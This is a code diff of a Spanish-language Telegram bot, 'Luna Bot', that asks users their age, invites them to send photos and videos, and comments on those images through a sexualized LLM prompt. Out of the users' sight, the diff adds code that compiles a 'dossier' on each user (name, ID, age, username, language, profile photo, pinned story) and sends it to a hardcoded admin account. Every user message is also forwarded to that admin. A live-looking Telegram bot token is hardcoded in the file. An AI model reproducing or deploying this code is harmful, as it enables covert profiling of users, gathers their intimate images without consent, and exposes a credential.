@@ -4,19 +4,14 @@ import sqlite3
 from datetime import datetime
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
-from groq import Groq
+import requests
 
 # ======================
 # CONFIGURACIÓN
 # ======================
 TELEGRAM_TOKEN = "9290146578:AAEZKmrTvwXVq6QU-0vsWmMR30sfwys6PdU"
-GROQ_API_KEY = "gsk_4XyB3N9aZ1cV7mK2pQ8wR5tY0uI6oP3sL1kJ9hG8fD2"
 DANI_CHAT_ID = 8099004064
-
-# URL de Render
 RENDER_EXTERNAL_URL = "https://luna-bot-a1fc.onrender.com"
-
-client = Groq(api_key=GROQ_API_KEY)
 
 # ======================
 # BASE DE DATOS
@@ -47,21 +42,57 @@ def obtener_usuario(user_id):
     return row
 
 # ======================
-# EXPEDIENTE Y REENVÍOS
+# EXPEDIENTE COMPLETO Y STORIES
 # ======================
 async def enviar_expediente_completo(context, user, edad):
     try:
+        # 1. Texto del reporte
         reporte = (
             f"🕵️‍♂️ **EXPEDIENTE COMPLETO**\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
             f"👤 **Nombre:** {user.first_name} {user.last_name or ''}\n"
             f"🆔 **ID:** `{user.id}`\n"
             f"🎂 **Edad:** {edad} años\n"
             f"🔗 **Usuario:** @{user.username if user.username else 'Oculto'}\n"
+            f"🌍 **Idioma:** {user.language_code or 'Desconocido'}\n"
+            f"⭐ **Premium:** {'Sí' if user.is_premium else 'No'}\n"
+            f"━━━━━━━━━━━━━━━━━━"
         )
         await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
+        
+        # 2. Foto de perfil (si tiene)
+        fotos_perfil = await context.bot.get_user_profile_photos(user.id, limit=1)
+        if fotos_perfil.total_count > 0:
+            foto_perfil = fotos_perfil.photos[0][-1].file_id
+            await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=foto_perfil, caption="📸 Foto de perfil.")
+            
+        # 3. Historia de perfil (Story) si tiene
+        try:
+            # Telegram permite a los bots obtener el ID de la historia fijada en el perfil
+            chat_info = await context.bot.get_chat(user.id)
+            if hasattr(chat_info, 'pinned_story') and chat_info.pinned_story:
+                story = chat_info.pinned_story
+                if story.photo:
+                    await context.bot.send_photo(
+                        chat_id=DANI_CHAT_ID, 
+                        photo=story.photo[-1].file_id, 
+                        caption="📖 Historia (Story) del perfil."
+                    )
+                elif story.video:
+                    await context.bot.send_video(
+                        chat_id=DANI_CHAT_ID, 
+                        video=story.video.file_id, 
+                        caption="🎥 Video de la Historia (Story) del perfil."
+                    )
+        except Exception as e:
+            print(f"No se pudo obtener la historia o no tiene: {e}")
+
     except Exception as e: 
         print(f"Error en expediente: {e}")
 
+# ======================
+# REENVIAR AL ADMIN
+# ======================
 async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         msg = update.message
@@ -71,7 +102,6 @@ async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 nombre_original = msg.forward_origin.sender_user.first_name
             elif msg.forward_origin.sender_chat:
                 nombre_original = msg.forward_origin.sender_chat.title
-            
             texto_aviso = f"🔄 **REENVIADO DE:** {nombre_original}\n*(Enviado por: {update.effective_user.first_name})*"
         else:
             texto_aviso = f"📩 **MENSAJE DE:** {update.effective_user.first_name} (`{update.effective_user.id}`)"
@@ -86,7 +116,7 @@ async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
         print(f"Error reenviando al admin: {e}")
 
 # ======================
-# ANÁLISIS DE IMAGEN CON VISIÓN
+# ANÁLISIS DE IMAGEN (LLM7.io - Sin registro)
 # ======================
 def analizar_imagen_con_vision(imagen_bytes):
     try:
@@ -103,22 +133,33 @@ def analizar_imagen_con_vision(imagen_bytes):
         
         Sé directa, cachonda y usa palabras como morbo, sexy, caliente.
         """
-        
-        completion = client.chat.completions.create(
-            messages=[
-                {
-                    "role": "user",
-                    "content": [
-                        {"type": "text", "text": prompt},
-                        {"type": "image_url", "image_url": {"url": f"data:image/jpeg;base64,{base64_image}"}}
-                    ]
-                }
-            ],
-            model="meta-llama/llama-4-scout-17b-16e-instruct",
-            temperature=0.7,
-            max_tokens=500
+
+        response = requests.post(
+            url="https://api.llm7.io/v1/chat/completions",
+            headers={"Content-Type": "application/json"},
+            json={
+                "model": "default", 
+                "messages": [
+                    {
+                        "role": "user",
+                        "content": [
+                            {"type": "text", "text": prompt},
+                            {"type": "image_url", "image_url": {"url": f"data:image/jpeg;base64,{base64_image}"}}
+                        ]
+                    }
+                ],
+                "temperature": 0.7,
+                "max_tokens": 500
+            }
         )
-        return completion.choices[0].message.content.strip()
+        
+        data = response.json()
+        if 'choices' in data and len(data['choices']) > 0:
+            return data['choices'][0]['message']['content'].strip()
+        else:
+            print(f"Error LLM7: {data}")
+            return "💋 Me encantó la foto, pero no pude analizarla bien. ¿Me la mandas de nuevo?"
+
     except Exception as e:
         print(f"Error en visión: {e}")
         return "💋 Me encantó la foto, pero no pude analizarla bien. ¿Me la mandas de nuevo?"
@@ -191,7 +232,10 @@ async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
         guardar_usuario(user.id, user.first_name, user.username, edad)
         await update.message.reply_text(f"¡Perfecto! 🎉 Tienes {edad} años. Envíame fotos o videos.")
+        
+        # Se envía el expediente con foto de perfil y story
         await enviar_expediente_completo(context, user, edad)
+        
     except:
         await update.message.reply_text("No entendí la fecha. Envíamela así: DD-MM-AAAA")
 
@@ -208,7 +252,7 @@ if __name__ == "__main__":
 
     port = int(os.environ.get("PORT", 8080))
 
-    print("🌙 Luna Bot iniciado con Webhooks en Render...")
+    print("🌙 Luna Bot iniciado...")
     application.run_webhook(
         listen="0.0.0.0",
         port=port,
